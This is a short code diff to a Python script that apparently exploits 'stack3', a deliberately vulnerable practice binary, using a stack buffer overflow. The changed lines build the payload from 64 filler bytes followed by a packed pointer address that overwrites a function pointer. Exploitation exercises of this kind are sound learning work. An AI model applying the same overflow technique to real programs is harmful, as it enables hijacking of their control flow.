@@ -3,6 +3,7 @@
 from subprocess import Popen
 from subprocess import PIPE
 import os                                                                                        # os.path.join(), os.getcwd()
+from struct import pack
 
 BINARY_NAME = "stack3"
 
@@ -11,7 +12,8 @@ def main():
     # LOCAL VARIABLES
     currEnv = os.environ.copy()
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
-    payload = "H" * 64 + "\x24\x84\x04\x08"
+    newPointer = pack("I", 0x08048424)  # 0x08048424
+    payload = "H" * 64 + newPointer
     commandList = []
 
     # VERIFY FILE    
